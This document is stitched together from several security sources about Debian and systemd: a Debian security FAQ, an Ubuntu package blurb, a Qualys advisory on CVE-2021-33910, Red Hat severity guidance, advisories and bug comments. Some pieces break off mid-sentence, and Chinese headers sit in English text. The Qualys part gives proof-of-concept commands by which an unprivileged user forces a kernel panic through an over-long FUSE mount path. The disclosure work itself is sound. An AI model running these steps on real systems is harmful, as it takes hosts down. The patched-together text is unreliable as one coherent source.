has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

## Binary packages built by this source

[libnss-myhostname](/ubuntu/xenial/%2Bpackage/libnss-myhostname):
nss module providing fallback resolution for the current hostname

This package contains a plugin for the Name Service Switch, providing host

 name resolution for the locally configured system hostname as returned by

 gethostname(2). It returns all locally configured public IP addresses or -- if

 none are configured, the IPv4 address 127.0.1.1 (which is on the local

 loopback) and the IPv6 address ::1 (which is the local host).

 .

 A lot of software relies on that the local host name is resolvable. This

 package provides an alternative to the fragile and error-prone manual editing

 of /etc/hosts.

 .

 Installing this package automatically adds myhostname to /etc/nsswitch.conf.

 state, maintains mount and automount points and implements an elaborate

 transactional dependency-based service control logic.

 .

 systemd is compatible with SysV and LSB init scripts and can work as a

 drop-in replacement for sysvinit.

 .

 This package provides the manual pages and links needed for systemd

 to replace sysvinit. Installing systemd-sysv will overwrite /sbin/init with a

 link to systemd.

Summary
========================================================================

In 2018, while working on our exploit for CVE-2018-14634 in the Linux
kernel, we accidentally discovered CVE-2018-16864 in systemd (journald);
in our "System Down" advisory we wrote: "Surprised by the heavy usage of
alloca() in journald, we searched for another attacker-controlled
alloca() and found CVE-2018-16865".

Recently, while working on our exploit for CVE-2021-33909 in the Linux
kernel, we accidentally stumbled upon CVE-2021-33910 in systemd (PID 1),
another attacker-controlled alloca():

[https://wiki.sei.cmu.edu/confluence/display/c/MEM05-C.+Avoid+large+stack+allocations](https://wiki.sei.cmu.edu/confluence/display/c/MEM05-C.%2BAvoid%2Blarge%2Bstack%2Ballocations)

Although attackers cannot exploit this vulnerability as a "Stack Clash"
to gain privileges (because the alloca()ted buffer is fully written to),
they can exploit it to crash systemd and hence the entire operating
system (a kernel panic). Our proof of concept, a 10-line change in
FUSE's "hello world" program, is attached to this advisory and is
available at:

<https://www.qualys.com/research/security-advisories/>

To the best of our knowledge, this vulnerability was introduced in
systemd v220 (April 2015) by commit 7410616c ("core: rework unit name
validation and manipulation logic"), which replaced a strdup() in the
heap with a strdupa() on the stack.

Note: a similar vulnerability was discovered in 2019 by Chris Coulson
(<https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6454>).

========================================================================
Analysis
========================================================================

systemd monitors and parses the contents of /proc/self/mountinfo, and
passes each mountpoint path to mount_setup_unit(), which passes it to
unit_name_from_path(), which passes it to unit_name_path_escape():

------------------------------------------------------------------------
1720 static int mount_load_proc_self_mountinfo(Manager *m, bool set_flags) {
....
1727         r = libmount_parse(NULL, NULL, &table, &iter);
....
1731         for (;;) {
....
1735                 r = mnt_table_next_fs(table, iter, &fs);
....
1742                 path = mnt_fs_get_target(fs);
....
1751                 (void) mount_setup_unit(m, device, path, options, fstype, set_flags);
------------------------------------------------------------------------
1644 static int mount_setup_unit(
1645                 Manager *m,
1646                 const char *what,
1647                 const char *where,
1648                 const char *options,
1649                 const char *fstype,
1650                 bool set_flags) {
....
1683         r = unit_name_from_path(where, ".mount", &e);
------------------------------------------------------------------------
512 int unit_name_from_path(const char *path, const char *suffix, char **ret) {
...
523         r = unit_name_path_escape(path, &p);
------------------------------------------------------------------------
380 int unit_name_path_escape(const char *f, char **ret) {
...
386         p = strdupa(f);
------------------------------------------------------------------------

At line 386, unit_name_path_escape() passes the mountpoint path to
strdupa(), which is similar to strdup() but allocates memory on the
stack (via alloca()), not in the heap (via malloc()).

As a result, if the total path length of this mountpoint exceeds 8MB
(the default RLIMIT_STACK), then systemd crashes with a segmentation
fault that also crashes the entire operating system (a kernel panic,
because systemd is the "global init", PID 1).

========================================================================
Proof of concept
========================================================================

- First, as an unprivileged local user, we mount a basic FUSE filesystem
  (with FUSE's "hello world" program) to /tmp/hello/world:

------------------------------------------------------------------------
$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)

$ mkdir -m 0700 -p /tmp/hello/world

$ ./CVE-2021-33910-crasher /tmp/hello/world

$ grep fuse /proc/self/mountinfo | wc
      2      22     239
------------------------------------------------------------------------

- Second, we create a deep directory whose total path length exceeds 8MB
  and move our FUSE filesystem to this directory:

------------------------------------------------------------------------
$ ./CVE-2021-33910-crasher /tmp/hello/world /tmp
creating directories, please wait...

$ grep fuse /proc/self/mountinfo | wc
      2      22 8389099
------------------------------------------------------------------------

- Third, to force systemd into re-parsing /proc/self/mountinfo (which
  contains our long directory path), we mount another FUSE filesystem
  and therefore crash systemd and the entire operating system:

------------------------------------------------------------------------
$ mkdir -m 0700 -p /tmp/hello/world

$ ./CVE-2021-33910-crasher /tmp/hello/world

Kernel panic - not syncing: Attempted to kill init!
------------------------------------------------------------------------

- Alternatively, because systemd v248 occasionally fails to monitor
  /proc/self/mountinfo (<https://github.com/systemd/systemd/issues/19464>)
  we force systemd into auto-mounting a filesystem itself; for example,
  the binfmt_misc filesystem:

------------------------------------------------------------------------
$ systemctl -a list-units '*binfmt_misc*'
  UNIT                              LOAD   ACTIVE   SUB     DESCRIPTION
  proc-sys-fs-binfmt_misc.automount loaded active   waiting Arbitrary...
  proc-sys-fs-binfmt_misc.mount     loaded inactive dead    Arbitrary...

$ cat /proc/sys/fs/binfmt_misc/status

Kernel panic - not syncing: Attempted to kill init!
------------------------------------------------------------------------

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2019%3A0204)

## Topic

An update for systemd is now available for Red Hat Enterprise Linux 7.5 Extended Update Support.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

The systemd packages contain systemd, a system and service manager for Linux, compatible with the SysV and LSB init scripts. It provides aggressive parallelism capabilities, uses socket and D-Bus activation for starting services, offers on-demand starting of daemons, and keeps track of processes using Linux cgroups. In addition, it supports snapshotting and restoring of the system state, maintains mount and automount points, and implements an elaborate transactional dependency-based service control logic. It can also work as a drop-in replacement for sysvinit.

Security Fix(es):

* systemd: stack overflow when calling syslog from a command with long cmdline (CVE-2018-16864)
* systemd: stack overflow when receiving many journald entries (CVE-2018-16865)

For more details about the security issue(s), including the impact, a CVSS score, and other related information, refer to the CVE page(s) listed in the References section.

Red Hat would like to thank Qualys Research Labs for reporting these issues.

| [Description](show_bug.cgi?id=1653855#c0)  Laura Pardo    2018-11-27 18:46:17 UTC  ``` A flaw was found in systemd-journald. A stack buffer overflow when passing several MB of arguments to a program calling syslog function. This can lead to a denial of service attack or arbitrary code execution in some cases.   ```  [Comment 1](show_bug.cgi?id=1653855#c1)  Doran Moppert    2018-11-28 02:23:55 UTC  ``` This boils down to a large alloca(), making it possible to jump the stack pointer into the heap and corrupt the heap region (a "Stack Clash" attack).  Since the alloca()ed region is completely written, this will eventually lead to a crash.  The reporters describe achieving code execution by combining the attack with a thread race inside journald, with careful timing they are able to attack the stack of a neighbouring thread which will return to the attacker's pointer before the crash occurs.   ```  [Comment 2](show_bug.cgi?id=1653855#c2)  Doran Moppert    2018-11-28 02:25:23 UTC  ``` Some restriction is placed on this attack by get_process_cmdline() substituting ' ' for all non-printable characters; this makes code execution more difficult to achieve.   ```  [Comment 3](show_bug.cgi?id=1653855#c3)  Doran Moppert    2018-11-28 02:30:39 UTC  ``` This vulnerability was introduced in systemd v203.   ```  [Comment 4](show_bug.cgi?id=1653855#c4)  Laura Pardo    2018-11-28 13:20:51 UTC  ``` Acknowledgments:  Name: Qualys Research Labs   ```  [Comment 6](show_bug.cgi?id=1653855#c6)  Riccardo Schirone    2018-11-29 14:00:30 UTC  ``` Function dispatch_message_real() in journal/journald-server.c constructs a record to write to the journal by converting each field to a string with the format "<field-name>=<field-value". Such strings are constructed by using the strjoina() function defined in basic/string-util.h, which allocates the resulting string on the stack with alloca(). If an attacker is able to make the stack clash with another memory region by providing a large attacker-controlled string, it is possible to overwrite the other region's data, causing crashes or possibly gaining code execution.  In this particular case, a process may have a big cmdline (as read from /proc/<pid>/cmdline) that could clash the stack and crash systemd-journald or gain code execution from within systemd-journald's context.   ```  [Comment 9](show_bug.cgi?id=1653855#c9)  Riccardo Schirone    2018-12-03 12:24:54 UTC  ``` If systemd is compiled with -fstack-clash-protection flag, like in Fedora 28/29, the flaw is not exploitable because stack clashing is prevented.   ```  [Comment 11](show_bug.cgi?id=1653855#c11)  Riccardo Schirone    2018-12-03 13:35:27 UTC  ``` Small fix to [comment 0](show_bug.cgi?id=1653855#c0) (stack buffer overflow vs stack overflow)  > A flaw was found in systemd-journald.

识别并修复受此公告影响的系统。

[查看受影响的系统](https://console.redhat.com/insights/patch/advisories/RHSA-2019%3A0049)

## 标题

An update for systemd is now available for Red Hat Enterprise Linux 7.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## 描述

The systemd packages contain systemd, a system and service manager for Linux, compatible with the SysV and LSB init scripts. It provides aggressive parallelism capabilities, uses socket and D-Bus activation for starting services, offers on-demand starting of daemons, and keeps track of processes using Linux cgroups. In addition, it supports snapshotting and restoring of the system state, maintains mount and automount points, and implements an elaborate transactional dependency-based service control logic. It can also work as a drop-in replacement for sysvinit.

Security Fix(es):

* systemd: Out-of-bounds heap write in systemd-networkd dhcpv6 option handling (CVE-2018-15688)
* systemd: stack overflow when calling syslog from a command with long cmdline (CVE-2018-16864)
* systemd: stack overflow when receiving many journald entries (CVE-2018-16865)

For more details about the security issue(s), including the impact, a CVSS score, and other related information, refer to the CVE page(s) listed in the References section.

Red Hat would like to thank Ubuntu Security Team for reporting CVE-2018-15688 and Qualys Research Labs for reporting CVE-2018-16864 and CVE-2018-16865. Upstream acknowledges Felix Wilhelm (Google) as the original reporter of CVE-2018-15688.

Package        : systemd
CVE ID         : CVE-2018-16864 CVE-2018-16865 CVE-2018-16866
Debian Bug     : 918841 918848

The Qualys Research Labs discovered multiple vulnerabilities in
systemd-journald. Two memory corruption flaws, via attacker-controlled
alloca()s (CVE-2018-16864, CVE-2018-16865) and an out-of-bounds read flaw
leading to an information leak (CVE-2018-16866), could allow an attacker to
cause a denial of service or the execution of arbitrary code.

Further details in the Qualys Security Advisory at
<https://www.qualys.com/2019/01/09/system-down/system-down.txt>

For the stable distribution (stretch), these problems have been fixed in
version 232-25+deb9u7.

We recommend that you upgrade your systemd packages.

# Security Data

Red Hat Product Security is committed to providing tools and security data to help security measurement. A part of this commitment is our active participation in various projects such as the CVE Project, the OASIS CSAF technical committee, or SBOM/VEX forums. We provide the raw data below so customers and researchers can produce their own metrics, for their own unique situations, and hold us accountable. To receive notifications when we fix bugs and add new features, please follow the official [Red Hat Security Data Changelog](https://access.redhat.com/articles/5554431).

The data resources linked on this page as well as their alternative representations available through the [Security Data API](https://access.redhat.com/documentation/en-us/red_hat_security_data_api/1.0/html/red_hat_security_data_api/index) are licensed under the [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/). If you distribute this content or a modified version of it, you must provide attribution to Red Hat, Inc. and provide a link to the original.

**Note:** Security data (CSAF, OVAL, SBOM, and other files) published by Red Hat Product Security was previously served from two locations:

